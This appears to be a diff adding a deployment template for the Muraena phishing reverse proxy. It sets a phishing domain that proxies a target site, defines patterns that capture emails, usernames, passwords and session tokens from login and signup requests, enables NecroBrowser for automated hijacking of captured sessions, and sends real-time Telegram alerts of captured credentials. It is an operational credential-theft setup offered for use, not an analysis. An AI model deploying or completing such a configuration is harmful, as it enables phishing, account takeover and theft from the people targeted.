@@ -1,0 +1,260 @@
+#
+# Muraena Configuration Template
+# This file uses placeholders that will be replaced during deployment
+#
+
+#
+# Proxy Configuration
+#
+[proxy]
+    # Phishing domain
+    phishing = "{{PHISHING_DOMAIN}}"
+
+    # Target domain to proxy
+    destination = "{{TARGET_DOMAIN}}"
+
+    # Listening IP address
+    IP = "0.0.0.0"
+
+    # Listening TCP Port
+    port = 443
+
+    # Force HTTP to HTTPS redirection
+    [proxy.HTTPtoHTTPS]
+    enable = true
+    HTTPport = 80
+
+
+#
+# Origins
+# Handle subdomains and external origins
+#
+[origins]
+    externalOriginPrefix = "cdn-"
+    externalOrigins = [
+        "{{TARGET_SUBDOMAIN_1}}",
+        "{{TARGET_SUBDOMAIN_2}}"
+    ]
+
+
+#
+# Transform
+# Proxy's replacement rules
+#
+[transform]
+    # Enable transformation rules in base64 strings
+    [transform.base64]
+        enable = true
+        padding = ["=", "."]
+
+    [transform.request]
+        headers = ["Cookie", "Referer", "Origin", "X-Forwarded-For"]
+        
+        remove.headers = [
+            "X-FORWARDED-FOR",
+            "X-FORWARDED-PROTO",
+        ]
+
+    [transform.response]
+        skipContentType = ["font/*", "image/*", "video/*", "audio/*"]
+
+        headers = [
+            "Location",
+            "WWW-Authenticate",
+            "Origin",
+            "Set-Cookie",
+            "Access-Control-Allow-Origin",
+        ]
+
+
+#
+# LOG
+#
+[log]
+    enable = true
+    filePath = "logs/muraena.log"
+
+
+#
+# Redis
+# For session storage and credential tracking
+#
+[redis]
+    host = "redis"
+    port = 6379
+    password = "{{REDIS_PASSWORD}}"
+
+
+#
+# TLS Configuration
+#
+[tls]
+    enable = true
+    expand = false
+    certificate = "./ssl/fullchain.pem"
+    key = "./ssl/privkey.pem"
+    root = "./ssl/fullchain.pem"
+    sslKeyLog = "./ssl/sslkeylog.log"
+
+    # Minimum supported TLS version
+    minVersion = "TLS1.2"
+    
+    # Renegotiation support
+    renegotiationSupport = "Never"
+
+
+#############################################################################
+# Modules
+#############################################################################
+
+#
+# Tracking
+# Credential and session tracking
+#
+[tracking]
+    enable = true
+    trackRequestCookie = true
+
+    [tracking.trace]
+        # Tracking identifier
+        identifier = "_track"
+        # Rule to generate and validate a tracking identifier
+        validator = "[a-zA-Z0-9]{8}"
+        # Tracking initial HTTP Header
+        header = "X-Track-ID"
+
+        [tracking.trace.landing]
+            # Tracking type: query parameter
+            type = "query"
+            # Landing HTTP Header
+            header = "X-Landing"
+
+    # Credential capture patterns
+    [tracking.secrets]
+        # Paths to monitor for credentials
+        paths = [
+            "/api/login",
+            "/api/auth/login",
+            "/api/auth/signin",
+            "/api/register",
+            "/api/auth/register",
+            "/api/auth/signup",
+            "/login",
+            "/signin",
+            "/register",
+            "/signup"
+        ]
+
+        # Email/Username capture
+        [[tracking.secrets.patterns]]
+        label = "Email Address"
+        start = "email="
+        end = "&"
+
+        [[tracking.secrets.patterns]]
+        label = "Email (JSON)"
+        start = "\"email\":\""
+        end = "\""
+
+        [[tracking.secrets.patterns]]
+        label = "Username"
+        start = "username="
+        end = "&"
+
+        [[tracking.secrets.patterns]]
+        label = "Username (JSON)"
+        start = "\"username\":\""
+        end = "\""
+
+        # Password capture
+        [[tracking.secrets.patterns]]
+        label = "Password"
+        start = "password="
+        end = "&"
+
+        [[tracking.secrets.patterns]]
+        label = "Password (JSON)"
+        start = "\"password\":\""
+        end = "\""
+
+        # Session tokens
+        [[tracking.secrets.patterns]]
+        label = "Session Token"
+        start = "session="
+        end = "&"
+
+        [[tracking.secrets.patterns]]
+        label = "Auth Token"
+        start = "token="
+        end = "&"
+
+        [[tracking.secrets.patterns]]
+        label = "Auth Token (JSON)"
+        start = "\"token\":\""
+        end = "\""
+
+
+#
+# NecroBrowser
+# Automated session hijacking and interaction
+#
+[necrobrowser]
+    enable = true
+    endpoint = "http://necrobrowser:3000/instrument"
+    profile = "./config/necro_profile.json"
+
+    # URLs that indicate successful authentication
+    [necrobrowser.urls]
+    authSession = [
+        "/account",
+        "/profile",
+        "/settings",
+        "/dashboard"
+    ]
+    authSessionResponse = [
+        "/dashboard",
+        "/account/overview"
+    ]
+
+    # Trigger conditions for NecroBrowser
+    [necrobrowser.trigger]
+    type = "cookie"
+    values = [
+        "session",
+        "auth_token",
+        "user_session",
+        "PHPSESSID",
+        "connect.sid"
+    ]
+    delay = 5
+
+
+#
+# Static Server
+# Serve custom phishing pages or resources
+#
+[staticServer]
+    enable = false
+    localPath = "./static/"
+    urlPath = "/static/"
+
+
+#
+# Watchdog
+# Advanced monitoring and alerting
+#
+[watchdog]
+    enable = true
+    dynamic = true
+    rules = "./config/watchdog.rules"
+    geoDB = "./config/geoDB.mmdb"
+
+
+#
+# Telegram Notifications
+# Real-time alerts for captured credentials
+#
+[telegram]
+    enable = {{TELEGRAM_ENABLED}}
+    botToken = "{{TELEGRAM_BOT_TOKEN}}"
+    chatIDs = [{{TELEGRAM_CHAT_IDS}}]
